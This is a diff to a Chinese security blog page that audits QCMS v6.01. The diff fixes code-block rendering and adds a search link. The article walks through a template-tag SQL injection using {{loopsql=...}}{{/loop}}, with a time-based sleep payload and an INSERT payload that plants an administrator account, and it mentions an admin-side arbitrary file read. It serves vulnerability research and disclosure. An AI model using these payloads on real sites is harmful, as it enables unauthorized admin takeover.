@@ -90,6 +90,8 @@
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
        --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
      -->
       </ul>
     </span>
@@ -187,19 +189,19 @@
 <p>然后我们跟进调试，最后在loop的地方找到sql利用点：</p>
 <p>​<img src="/Blogimages/QCMS_v6.01/image-20230517190856-2j3xino.png" alt="image">​</p>
 <p>这里有个正则要过：</p>
-<pre class=" language-xml"><code class="language-xml">/<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loop([\s\S.]*?)<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>([\s\S.]*?)<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>\/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>/i
+<pre class=" language-xml"><code class="language-xml">/{{loop([\s\S.]*?)}}([\s\S.]*?){{\/loop}}/i
 </code></pre>
 <p>匹配很简单</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>a<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
+<pre class=" language-xml"><code class="language-xml">{{loop}}a{{/loop}}
 </code></pre>
 <p>并且这里要匹配的是$Matches[1]</p>
 <p>​<img src="/Blogimages/QCMS_v6.01/image-20230517191025-pj8v8sn.png" alt="image">​</p>
 <p>所以就要控制</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loop(要控制的地方)<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>a<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
+<pre class=" language-xml"><code class="language-xml">{{loop(要控制的地方)}}a{{/loop}}
 </code></pre>
 <p>‍</p>
 <p>并且下面还有一句$Para[‘sql’],所以要控制这个地方是</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loopsql<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>a<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
+<pre class=" language-xml"><code class="language-xml">{{loopsql}}a{{/loop}}
 </code></pre>
 <p>进入<code>self::_getKv($v)</code>​</p>
 <p>​<img src="/Blogimages/QCMS_v6.01/image-20230517191503-o34dp04.png" alt="image">​</p>
@@ -208,7 +210,7 @@
 </code></pre>
 <p>这里是形式就是sql&#x3D;’xxx’了</p>
 <p>我们传参</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loopsql=''xxx<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>a<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
+<pre class=" language-xml"><code class="language-xml">{{loopsql=''xxx}}a{{/loop}}
 </code></pre>
 <p>这样子就返回sql&#x3D;’xxx’了</p>
 <p>​<img src="/Blogimages/QCMS_v6.01/image-20230517191653-e4onphr.png" alt="image">​</p>
@@ -224,21 +226,21 @@ Router.php:97, Router->ViewController()
 Router.php:22, Router->__construct()
 Router.php:25, Router::get_instance()
 X.php:27, require()
-index.php:29, <span class="token entity" title="&#123;">&amp;#123;</span>main<span class="token entity" title="&#125;">&amp;#125;</span>()
+index.php:29, {main}()
 </code></pre>
 <p>​<img src="/Blogimages/QCMS_v6.01/image-20230517192004-ufhk7j5.png" alt="image">​</p>
 <p>发现这里直接对传入进去的xx执行了，那么sql注入就来了</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loopsql='select sleep(1)'<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
+<pre class=" language-xml"><code class="language-xml">{{loopsql='select sleep(1)'}}{{/loop}}
 </code></pre>
 <p>危害证明：</p>
 <p>​<img src="/Blogimages/QCMS_v6.01/image-20231003192019-t5dzdb0.png" alt="image">​</p>
 <p>输入延时语句查询，发现这里延时了7s，因为</p>
-<pre class=" language-php"><code class="language-php">        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+<pre class=" language-php"><code class="language-php">        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
             <span class="token variable">$Para</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">_getKv</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$Para</span><span class="token punctuation">[</span><span class="token string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span> 
             <span class="token variable">$Search</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
             <span class="token variable">$Replace</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">_replaceLoop</span><span class="token punctuation">(</span><span class="token variable">$Para</span><span class="token punctuation">[</span><span class="token string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'Loop_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token punctuation">}</span>
 </code></pre>
 <p>这一句会导致sleep多次执行，所以会导致延迟七秒</p>
 <p>如果我们把sleep的时间换成2：</p>
@@ -246,7 +248,7 @@ index.php:29, <span class="token entity" title="&#123;">&amp;#123;</span>main<sp
 <p>而且我们在sql的执行日志中也可以看到sleep(2)执行了7次</p>
 <p>​<img src="/Blogimages/QCMS_v6.01/image-20231003192326-zl735j8.png" alt="image">​</p>
 <p>这里就可以修改数据库的密码了：</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>loopsql='INSERT INTO qc_user (UserId, Phone, NickName, Head, Password, Name, Address, Sex, Mail, MailCheck, Money, Coins, State, TsAdd, IpAdd, GroupUserId, GroupAdminId, IsAdmin, TsLast, IpLast) VALUES (999, "18898765432", "管理员", "", "e10adc3949ba59abbe56e057f20f883e", "", "", 1, "", 2, 0.00, 0, 1, 1684310395, "127.0.0.1", 1, 1, 1, 1684310876, "127.0.0.1");'<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>a<span class="token entity" title="&#123;">&amp;#123;</span><span class="token entity" title="&#123;">&amp;#123;</span>/loop<span class="token entity" title="&#125;">&amp;#125;</span><span class="token entity" title="&#125;">&amp;#125;</span>
+<pre class=" language-xml"><code class="language-xml">{{loopsql='INSERT INTO qc_user (UserId, Phone, NickName, Head, Password, Name, Address, Sex, Mail, MailCheck, Money, Coins, State, TsAdd, IpAdd, GroupUserId, GroupAdminId, IsAdmin, TsLast, IpLast) VALUES (999, "18898765432", "管理员", "", "e10adc3949ba59abbe56e057f20f883e", "", "", 1, "", 2, 0.00, 0, 1, 1684310395, "127.0.0.1", 1, 1, 1, 1684310876, "127.0.0.1");'}}a{{/loop}}
 </code></pre>
 <p>‍</p>
 <h2 id="后台任意文件读取"><a href="#后台任意文件读取" class="headerlink" title="后台任意文件读取"></a>后台任意文件读取</h2><p>进入后台有一个任意文件读取，这个就比较简单了，直接用Seay就可以审计出来了</p>
@@ -285,6 +287,8 @@ index.php:29, <span class="token entity" title="&#123;">&amp;#123;</span>main<sp
           <li><a href="/categories/">分类</a></li>
         
           <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
         
       </ul>
     </div>
@@ -347,6 +351,8 @@ index.php:29, <span class="token entity" title="&#123;">&amp;#123;</span>main<sp
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+    --><!--
+      --><li><a href="/search/">搜索</a></li><!--
     -->
       </ul>
       <ul>
